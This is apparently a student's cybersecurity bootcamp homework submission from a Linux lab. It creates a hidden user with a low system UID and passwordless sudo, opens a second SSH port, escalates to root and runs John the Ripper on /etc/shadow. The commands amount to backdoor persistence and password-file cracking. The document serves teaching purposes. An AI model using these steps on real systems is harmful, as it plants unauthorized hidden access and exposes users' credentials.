## Week 6 Homework Submission File: Advanced Bash - Owning the System

#### By Steven Pigatto

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `useradd sysd`

2. Give your secret user a password: 
    - `passwd sysd`

3. Give your secret user a system UID < 1000:
   -    `usermod -u 111 sysd`

4. Give your secret user the same GID:
   - `groupmod -g 113 sysd`

5. Give your secret user full `sudo` access without the need for a password:
   -  `visudo`
   -  `sysd ALL=(ALL) NOPASSWD:ALL`

6. Test that `sudo` access works without your password:

    ```bash
    sudo -l
    Matching Defaults entries for root on scavenger-hunt:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User root may run the following commands on scavenger-hunt:
    (ALL : ALL) ALL

    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

    ```bash
    cd /etc/ssh
    nano sshd_config
    add Port 2222 under #Port 22
    Ctrl + x
    Y to save.
    ```

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - `systemctl restart sshd`

2. Exit the `root` account:
    - `exit`

3. SSH to the target machine using your `sysd` account and port `2222`:
    - `ssh sysd@192.168.6.105 -p 2222`

4. Use `sudo` to switch to the root user:
    - `sudo su`

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

    - `ssh -p 2222 192.168.6.105`

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:
   - `sudo su`
   -    `cd /etc`
    -  `john shadow`

---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

